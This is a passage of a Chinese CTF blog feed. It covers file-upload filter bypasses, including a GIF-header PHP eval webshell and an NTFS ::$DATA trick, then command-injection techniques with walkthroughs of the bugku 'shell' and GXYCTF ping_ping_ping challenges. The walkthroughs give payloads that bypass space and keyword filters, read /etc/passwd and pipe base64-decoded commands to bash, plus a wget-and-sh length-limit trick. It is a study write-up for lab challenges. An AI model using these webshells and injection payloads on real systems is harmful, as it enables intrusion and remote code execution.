class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);   <span class="hljs-comment">//取后缀</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//首尾去空</span><br>        <br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>进行了首尾去空以及转换大小写操作，同时把$DATA也去除了</p><p>但是没有使用delot()去除文件名末尾的点，于是可以抓包，然后在文件后缀结尾处加’.’绕过，上传成功后，win会自动把后缀名中的点去掉</p><h1 id="page-09-DATA绕过"><a href="#page-09-DATA绕过" class="headerlink" title="page-09 ::$DATA绕过"></a>page-09 ::$DATA绕过</h1><p>原理:<br>源代码缺少 $file_ext &#x3D; str_ireplace(‘::$DATA’, ‘’, $file_ext);&#x2F;&#x2F;去除字符串::$DATA限制，可以文件名后缀增加::$DATA绕过</p><p>Windows下NTFS文件系统的一个特性，即NTFS文件系统的存储数据流的一个属性 DATA 时，就是请求 a.asp 本身的数据，如果a.asp 还包含了其他的数据流，比如 a.asp:lake2.asp，请求 a.asp:lake2.asp::$DATA，则是请求a.asp中的流数据lake2.asp的流数据内容(么看懂)</p><p>NTFS文件流实际应用<br>NTFS文件系统包括对备用数据流的支持。这不是众所周知的功能，主要包括提供与Macintosh文件系统中的文件的兼容性。备用数据流允许文件包含多个数据流。每个文件至少有一个数据流。在Windows中，此默认数据流称为：$DATA<br>在window的时候如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名，且保持::$DATA之前的文件名，他的目的就是不检查后缀名</p><p>解题步骤<br>上传文件名info8.php::$DATA，访问时去除后缀<br>(.phtml文件是指嵌入了php代码的html文件)</p><p>绕过WAF通常用8同形式的编码</p><h1 id="文件幻术头绕过"><a href="#文件幻术头绕过" class="headerlink" title="文件幻术头绕过"></a>文件幻术头绕过</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">GIF89</span>a? <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;php&quot;</span>&gt;</span><span class="language-javascript"><span class="hljs-built_in">eval</span>($_REQUEST[<span class="hljs-number">1</span>])</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span>  <span class="hljs-comment">//文件幻术头绕过...</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>战斗记忆</title>
    <link href="/2022/03/26/%E6%88%98%E6%96%97%E8%AE%B0%E5%BF%86/"/>
    <url>/2022/03/26/%E6%88%98%E6%96%97%E8%AE%B0%E5%BF%86/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="fc63285e543951ae0a15b64d6485f8eda42135b3a273da3743a6cb9c930faff7">e4bd6587f5b022b7ffbfbb7e009dbc1673e44afafaac8e35539580f7c0d16876c8e0ea10f0a28ab382bacc6420450ee20634dcba2202b1d9a745ec6febb78fab82f5b8251154167c006eb7e914edd429fa4c99b83a33db3c6c6eb24a0a661d4a758f6e1c360d45cb083d66f7bc538fa58891f88975e17107a340bdb1af8aba42b32d22e882e71ba12ef71c71dda5f0e72aff9659e94ccb0e5a5ee8e3a6adacfd8b7d42d3080f592273afc4975a6687e17c9bec7b7c3abbcf69f1b3344e5455596d774eb8bae522c96a75c7841efa170a26b0d94f22c58da4b5398dad49986defa08cc74600ef41afb6adb779bdf7e1772cc28bcc74a7914373429827598d378951ac2bba3c59f92ce7587b3efa2ac2b53bbc350d78582cc9c0390c18f5caff3754e52d7a72f543f5f37f7de24211329e705725f226c1915df6aab4920778548e35ca307f5cb3a6bcb1f50b2cdeb1cece24e30dfa418fe5cb79ada6c80f46539f4c4b1d5a87d996690f9020704a1eb2ff6ba55652158cae48b82a8e81244abd6008894762c6c4418406f00dff242035868d871dc36b6e3f8f66d3a9b5009a5092b1e4fa64a5df30a4cde0f9fcf72df2e7eb7b03d0b3226d7e768204e207beb1f31c95c878a806482ed55a713a925a86ba9d9794fbe17946c00e1b1b6640e039c6d31672dfdf9f83ecad3bf75a95ac32a2781e579e131b4a29b7dd71551ed5d1176ab7ff0c7c7e955add1abe87eb04284713ee403e0b9a08039ca94fb3bac00bc5747e590589e4833a283361c1553bdca65b82caa99921ead5e395110c452db8de7f4d1daed33d912bbcd147b3b3442379c8bfba716a12cc7db90373a715120e13d965aa5fb9a354dbe921711d906b944a7177c7e1837e66c3d07d417fb2706d6a2eceec7b81067c2893ead2501c270c8c8f37b9abf3a3324d5e83377d87e04cc3311b09895b03fede1d113f8141f792db4619d52b3335a6ddf870808a58100fb646033f5886ea3053205328b4d09ded3e95d3c3260a2dc0e58dba3a83885535b5c07c2ec9c935b3185dda764604a7676e6d6332add8099c2c196e14799126e6d34afbbe6218e2795c58b243d89362bde30befb6294862f1888ff4266515bbda37af37830ff172e70e82f0010e895cae385365fe63f8d941cc7349daa5467e69edf99eb205ca1910bcde96bdd389a17c54a3ff51036fb69c519da4acd3f733670f1ab326158b82f676ea7b85e5bb173d82440e6710f9ed11092da9f61457f1f4e0816a2fbee830ccc378479d182400c31a94955f7de3998776343bf02e58680ecb97cfe694edf8fd2ba8241d2d5937725f77136f6a69d5f269c86a962babd0c81781f32560409293f4421082d354c3b4772accc0d1d7039b4423f3be66f270c90002e26c2c54cd420b1eb35e18033b6d6291a6b08221174b736e1975ca196d57a2e4e78999ae9e3762fff8831ec41fd198b97fca2213735721101dd52f3e0c8ee4bf59c2cde649ca5350f4637d8404570521e083a1795f8f85af42b7d5aca53b2553376c9a02cd6148c24aa684b928969f3b6c9b4fe5af921f39b85180e62a4e0ab81606bf5d01e9d31de89b9e39223fbe22a849cb65f4de6dae9ab7ff80d92c3cc545d0cf420dbcbc37caef327579d4a00bbf0a5aab3fa45d4be8d1ab62f300d29929bec0ec16fcff73ef84f76ea1898310a64efe9041df2f4aeed7dfd61164f97c438de578d78049dc29dd81fd26a5abac55c476c6364c779bb08290dbff0ff63c387bd71db73340aceff129c965c9de1391b7b1203f7aa5a4d21dd3e319a85bdf273aa94773dc10a03eca106a8a2d3bcadef19bdbf2ae36e0c5084a6633c1caf7e33f43fec9b1f7f228109aea0ec8438fa8ae92fcda76dba28c935e7f5ff3eb27a1adeadba50265f1572f0a7166d31bd4cb5daad2aec4374f3505976b93cfbb683e80f2d2d52ea30753d309568461215df0caa6f62ada5e524d8eb1fc2e0fb764ccd5a347de1d88f1bbfaf4edb09107e2e284b48dbab1aa666f8a88765870cfcc8f0c65b94dbca61be675f167eb47494cf08ae5794b38de7625e053d998756e45ec07b67231ca6526ba3f2953d6ee4df88cc354bce20f0e7ad3df5f808d20e1927ff5e0fa2b15f1292c2ccc476f4aef588bf420fac5cdbb3c743a5f5a5a836074d1f4503c2ad9750128f769f43553cd2afd5d9791ee52417e5ed2e513f189394965a2f3090903cafbc4983a82988d3b674ba74e031fb3600349d7c32a25bb0cd267e8e650d3ca1c5eba7dea73afeb9a34a492da51e1bf4554e158cb585d0c8f3b356e194e9249ca8f50a278b7e6ab9f02f2ac5fb96b5066599c964e5666ac6c1bc294d90087b2bf35c6aad218a8ed1b3d617ff184593666794c9bc3d27503913dbf9fc7f7d30d32dba043309d1317a3f47f83d38260b29c0b50b0534c569d6ded8e1eebd7b93c2a7e2429901b9963f837bd7e032201ba734c7a787cc07c96b438b9035b0fbb14795cdb45c312dbd9b8c74d85149520f11fcf56aa248978b8834d0d3b6a2bf456c23550a5cc0bd5a27f9946d125216b6ab37323c4320c0ccbcae8c3dbb6134e4c096521c5d7b0e5b945251a17c011e8b76cfd55c30c1dfa34e90c2e49bbc1a93b9155e1b7aedf84a37118c9885ed9ad612423cf6ede6634d757fd6659f68dffba9bd81f24a3bf618bf77e8bbfcdd1dbc8342274e76e4a5758e4a66007e99bc16700023d31f956eb16419501d502d199dfdc673cde925a21f1b74abe8e5abd1c46aa79bd26da0bb3e5ccb696a0c9bb816c9ca4bb8e3d05aa7e8b0fa9a0c219ac33278ecbcf831f78d6ada634b077bf5e45eb0103768ae7c1aee1b244d7086d816bbc6586d08bf92480af5188ac5248a0de9624602df5d31cf5898d7c0cf7aebaf1ea6f4b12caf15881c04ac3dbfb3f6309c77324ae1e78aa03da51896156e4d2a0562b7cb74a8b4d39761c7351df275a0ac5c4fc91824fe9c781252c378e17db184cc98cdf89c48f2772bfab7afdf4ccab5113e1fcf37fea6c90b5773040c58fd32faeb62dc6b92ac0721bfc8402214192f54ab6a6800e57e1bd3f1985a5b5cb4955eb29a8903ba13a29ed5aa158d0edc9693c76637c3d56b6e47e39760e6eaf966b7e4432815d5c0d4d34d424647714edd6226bf3d06508390d12a1e9f66327862acf01e1b246ca29eecc5c72ba2fa30ab12c433d0e9ca8e777322657cef6470ca633a29f2756873a1b88e70eb9e571f0cc8ad560110224daaf0c42a2676ae74b42cd2aa665d472dcfc0345bd7dd0adb7288c56128a772149b06bcc2e517fe0667811503b7e7d0b5700322959105b7931e1dc62713d71b534d935be277409cc6516d4f917ffab12f9f328dad8df31f6bee2eaba6486a888ecb3514383b11fe06ead05be3a86a45bbbe3bfa057e3e0081fa1ea19925e54729d2c1f040a2f1806fa3442e9af8a4246a16e8c7a8e4813c3a3bba3f7971b15096df1743e7c7897e0f8b80755117c4a74933631f640af5c016833e3a0d06feb0c952addef6f84ce9e9a0026e8acad62895cc61141361f404e1261b02e600a9e17bed920cf26762e7cc8a7e9b7c219f10018a2219aa72f3f06982205024dac859386bb98c57c928363b8624a181b7ce09d14bd3b5af423349e58b519c28246f4c8bc6dc34eedf367c9a87475ea0380edeca8cd937e76e0f55d694d8a4e27fd6645d5165ad03608db62ef8669a53fc409b48eb5b1ebb15b8bd3d99c6f02440bd770551b3c0ac2ad56627f369c2d4521d6db0166153f82b7e1f0b4e139ef32837ce1f7cf5ff1ed053b2bca7bd34bc050d80ebbcc6affec672d93183d7a2a321508ac21d59813b9caf12f14c0d4d067e9a86a41af52b37e025dca6225d6df709b94ba0e9353dc6bde90a2174469bab74cfb274f76bd914cc92929d028044384e95ed48b160ea9c56efb6d346314d7c086b9b083e93f70e183926d9418c976ddce42b3c59433f1cb7392e1a865c13c9f5df5ffe53fe439748f19443f191465bd7edd3c96ba5fa17dd1154358538c72d32edfd4348fff9b3a8b58253e84eeee4eaa0db30f4d5e0f328baa89083b8ee190308edb7787cff809c29dea63c0b91b9cf0089ec6a75d7bc751175d4a21429df6efcc3ff32a512eb409820f377d4fc9aaba55fbddd29be11a40c0a7af1cc6400d7c205a1be9eaec1c50c0c9287ffac650cac3aa990d786de336c5010eb96e52e287c07f300f178c28aadd6ec421b26b5df85ae0ab3a1863082e43ec619384750e4e1253a60ab0a2f0a7af3c16d498cd7c1390b6abc6bcf5325a65cf99b74ba63255905fd753196fa725448b348cf7eb1f4d268b968b844c76c90118cb7ac55033dd0d039229592b8b66c74ec7d6d00e4e9e21fb3d455321e8fbcf54d86899da6cdd107d72756f01ce962dd0bd24244c710561cdcb1f22151ed84ed6063ec4a9d9952db8a167</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">为菈妮，我变成狼人模样</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>大道三千</category>
      
    </categories>
    
    
    <tags>
      
      <tag>大道三千</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>命令执行漏洞</title>
    <link href="/2022/03/24/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
    <url>/2022/03/24/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<p>命令注入通常因为指Web应用在服务器上拼接系统命令而造成的漏洞，通常出现在调用外部程序完成一些功能的情景下。比如一些Web管理界面的配置主机名&#x2F;IP&#x2F;掩码&#x2F;网关、查看系统信息以及关闭重启等功能，或者一些站点提供如ping、nslookup、发送邮件、转换图片等功能都可能出现该类漏洞。</p><!-- about --><h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><p>在win或linux下，<br>||: [command1]||[command2]表示先执行command1, 若command1为假，则执行command2;<br>&amp;&amp;: 先执行command1, 若为真，则执行command2<br>|: 表示只执行command2(在必须输入command1且只想返回command2(比如回显行数被限定)的时候有用)<br>&amp;: 先执行command1再执行command2<br>;: 前面的执行完执行后面的<br>ls &#x2F;(注意空格): 列出根目录下的所有文件<br>pwd: (print work directory), 用于立刻显示当前所在目录</p><h2 id="常见危险函数"><a href="#常见危险函数" class="headerlink" title="常见危险函数"></a>常见危险函数</h2><p>PHP:<br>system<br>exec<br>passthru<br>shell_exec<br>popen<br>proc_open</p><p>Python:<br>system<br>popen<br>subprocess.call<br>spawn</p><p>Java:<br>java.lang.Runtime.getRuntime().exec(command)</p><h1 id="命令联合执行"><a href="#命令联合执行" class="headerlink" title="命令联合执行"></a>命令联合执行</h1><p>就是利用|、||、&amp;、&amp;&amp;</p><h1 id="内联执行"><a href="#内联执行" class="headerlink" title="内联执行"></a>内联执行</h1><p>就是将反引号内的输出当作输入执行<br>作业:  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/?ip=127.0.0.1|<span class="hljs-built_in">cat</span>$IFS<span class="hljs-variable">$9</span>`<span class="hljs-built_in">ls</span>`<br></code></pre></td></tr></table></figure><h1 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h1><h2 id="命令执行绕过空格"><a href="#命令执行绕过空格" class="headerlink" title="命令执行绕过空格"></a>命令执行绕过空格</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span>&#123;IFS&#125;<span class="hljs-variable">$9</span><br>&#123;IFS&#125;<br><span class="hljs-variable">$IFS</span><br><span class="hljs-variable">$</span>&#123;IFS&#125;<br><span class="hljs-variable">$IFS</span><span class="hljs-variable">$9</span><br><span class="hljs-variable">$IFS</span><span class="hljs-variable">$1</span> //<span class="hljs-variable">$1</span>改成<span class="hljs-variable">$</span>加其他数字貌似都行<br>IFS<br>&lt; <br>&lt;&gt; <br>&#123;<span class="hljs-built_in">cat</span>,flag.php&#125;  //用逗号实现了空格功能，需要用&#123;&#125;括起来<br>%<span class="hljs-number">20</span>   (space)<br>%<span class="hljs-number">09</span>   (tab)<br>X=<span class="hljs-variable">$</span><span class="hljs-string">&#x27;cat\x09./flag.php&#x27;</span>;<span class="hljs-variable">$X</span>       （\x09表示tab，也可以用\x20）<br></code></pre></td></tr></table></figure><h2 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">a=l;b=s;<span class="hljs-variable">$a</span><span class="hljs-variable">$b</span><br>echo <span class="hljs-string">&quot;bHM=&quot;</span> | base64 -d  <span class="hljs-regexp">//</span>base64绕过<span class="hljs-string">&#x27;ls&#x27;</span>---&gt;思路扩展，可否换成其他编码呢? <br><span class="hljs-regexp">/?in/</span>?s =&gt; <span class="hljs-regexp">/bin/</span>ls<br>cat <span class="hljs-regexp">/etc/</span>pass<span class="hljs-string">&#x27;w&#x27;</span>d       <span class="hljs-regexp">//</span>连接符绕过<br>cat<span class="hljs-variable">$x</span> <span class="hljs-regexp">/etc/</span>passwd       <span class="hljs-regexp">//</span>未定义的初始化变量绕过<br></code></pre></td></tr></table></figure><h2 id="长度限制绕过"><a href="#长度限制绕过" class="headerlink" title="长度限制绕过"></a>长度限制绕过</h2><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vim">&gt;wget\<br>&gt;foo.\<br>&gt;<span class="hljs-keyword">com</span><br><span class="hljs-keyword">ls</span> -t&gt;<span class="hljs-keyword">a</span><br><span class="hljs-keyword">sh</span> <span class="hljs-keyword">a</span><br></code></pre></td></tr></table></figure><p>上述方法为通过命令行重定向<strong>写入命令</strong>，通过ls将这些命令写入文件a，最后执行</p><h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><h2 id="bugku-shell"><a href="#bugku-shell" class="headerlink" title="bugku shell"></a>bugku shell</h2><p>打开后发现是空白页面，根据提示:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$poc</span>=<span class="hljs-string">&quot;a#s#s#e#r#t&quot;</span>;<br><span class="hljs-variable">$poc_1</span>=<span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;#&quot;</span>,<span class="hljs-variable">$poc</span>);   <span class="hljs-comment">//把字符打散为数组</span><br><span class="hljs-variable">$poc_2</span>=<span class="hljs-variable">$poc_1</span>[<span class="hljs-number">0</span>].<span class="hljs-variable">$poc_1</span>[<span class="hljs-number">1</span>].<span class="hljs-variable">$poc_1</span>[<span class="hljs-number">2</span>].<span class="hljs-variable">$poc_1</span>[<span class="hljs-number">3</span>].<span class="hljs-variable">$poc_1</span>[<span class="hljs-number">4</span>].<span class="hljs-variable">$poc_1</span>[<span class="hljs-number">5</span>]; <span class="hljs-comment">//asset</span><br><span class="hljs-variable">$poc_2</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;s&#x27;</span>]);<span class="hljs-comment">//asset($_GET[&#x27;s&#x27;]); asset():判断1个表达式是否成立，返回True和False(重点在于:里面的表达式会被执行)</span><br></code></pre></td></tr></table></figure><p>于是输入&#x2F;?s&#x3D;system(‘ls’)<br>返回: flaga15808abee46a1d5.txt index.php </p><p>所以这题讲了个啥？ 好像是科普了一个一句话木马<br>科普: assert是能执行shell命令的危险函数之一</p><h2 id="ping-ping-ping-GXYCTF-命令联合执行"><a href="#ping-ping-ping-GXYCTF-命令联合执行" class="headerlink" title="ping_ping_ping GXYCTF  命令联合执行"></a>ping_ping_ping GXYCTF  命令联合执行</h2><p>进入后是一个ping网址，这类题见了8下3次了，属于命令执行漏洞(或sql注入)，需要对linux指令有一定了解<br>(这种网站路由器种经常会见到)<br>输入127.0.0.1，ping成功了，说明有命令执行漏洞(为什么呢? 某个wp说的，俺也8清楚….)<br>然后因为贫瘠的linux知识，于是先试试sql注入吧<br>闭合失败…..<br>那就是命令执行漏洞了<br>开始注</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">/?ip=127.0.0.1 | <span class="hljs-built_in">ls</span>     //成功回显flag.php<br>/?ip=127.0.0.1;<span class="hljs-built_in">cat</span> flag.php      //回显<span class="hljs-string">&quot;fuxk your space&quot;</span>，说明检测空格，需要绕过   <br>/?ip=127.0.0.1;<span class="hljs-built_in">cat</span><span class="hljs-variable">$&#123;IFS&#125;</span><span class="hljs-variable">$9index</span>.php     //回显<span class="hljs-string">&quot;fuxk your symbol&quot;</span>，没看懂....这下没辙了<br>/?ip=127.0.0.1;<span class="hljs-built_in">cat</span>%20flag.php    //<span class="hljs-string">&quot;fuxk your flag&quot;</span>，屏蔽flag关键词<br>/?ip=127.0.0.1|<span class="hljs-built_in">cat</span>$IFS<span class="hljs-variable">$9</span>`<span class="hljs-built_in">ls</span>`     //回显了index.php的内容<br></code></pre></td></tr></table></figure><p>但是为什么只有后半部分的内容?</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-operator">/?</span>ip<span class="hljs-operator">=</span><br><span class="hljs-operator">|</span>\&#x27;<span class="hljs-operator">|</span>\<span class="hljs-string">&quot;|<span class="hljs-subst">\\</span>|<span class="hljs-subst">\(<span class="hljs-operator">|</span>\)</span>|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="hljs-variable">$ip</span>, <span class="hljs-variable">$match</span>))&#123;<br>    echo preg_match(<span class="hljs-string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|<span class="hljs-subst">\&#x27;</span>|<span class="hljs-subst">\&quot;</span>|<span class="hljs-subst">\\</span>|<span class="hljs-subst">\(<span class="hljs-operator">|</span>\)</span>|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="hljs-variable">$ip</span>, <span class="hljs-variable">$match</span>);  <span class="hljs-comment">//屏蔽了....特殊字符，正则匹配还是没学好....&amp; / ？ * &lt; x&#123;00&#125;-\x&#123;1f&#125; &#x27; &quot; \ () [] &#123;&#125;  空格</span><br>    die(<span class="hljs-string">&quot;fxck your symbol!&quot;</span>);<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/ /&quot;</span>, <span class="hljs-variable">$ip</span>))&#123;   <span class="hljs-comment">//屏蔽空格</span><br>    die(<span class="hljs-string">&quot;fxck your space!&quot;</span>);<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/bash/&quot;</span>, <span class="hljs-variable">$ip</span>))&#123;    <span class="hljs-comment">//屏蔽关键词</span><br>    die(<span class="hljs-string">&quot;fxck your bash!&quot;</span>);<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, <span class="hljs-variable">$ip</span>))&#123;   <span class="hljs-comment">//屏蔽flag，贪婪匹配</span><br>    die(<span class="hljs-string">&quot;fxck your flag!&quot;</span>);<br>  &#125;<br>  <span class="hljs-variable">$a</span> <span class="hljs-operator">=</span> shell_exec(<span class="hljs-string">&quot;ping -c 4 &quot;</span>.<span class="hljs-variable">$ip</span>);    <span class="hljs-comment">//执行</span><br>  echo <span class="hljs-string">&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;</span>;<br>  print_r(<span class="hljs-variable">$a</span>);<br>&#125;<br><span class="hljs-operator">?&gt;</span><br></code></pre></td></tr></table></figure><p>好吧…前3个都能想办法绕过，但第4个….<br>有几种方法，都记录一下</p><h3 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">?ip=<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>;a=g;<span class="hljs-built_in">cat</span><span class="hljs-variable">$IFS</span><span class="hljs-variable">$1fla</span><span class="hljs-variable">$a</span>.php有flag<br>?ip=<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>;b=ag;a=<span class="hljs-built_in">fl</span>;<span class="hljs-built_in">cat</span><span class="hljs-variable">$IFS</span><span class="hljs-variable">$1</span><span class="hljs-variable">$a</span><span class="hljs-variable">$b</span>.php 有flag<br></code></pre></td></tr></table></figure><p>然后有一些疑惑的地方:<br>为什么最终flag是在源码的注释里写的? 想了想明白了，这个是出题人挖的坑，因为flag.php文件写的flag就是用注释括起来的，于是最终嵌入html代码时就会只在源码中显示</p><h3 id="bash-sh-base64"><a href="#bash-sh-base64" class="headerlink" title="bash $ sh +base64"></a>bash $ sh +base64</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">?ip=<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>;echo<span class="hljs-variable">$IFS</span><span class="hljs-variable">$1Y2F0IGZsYWcucGhw</span>|base64<span class="hljs-variable">$IFS</span><span class="hljs-variable">$1</span>-d|bash  <span 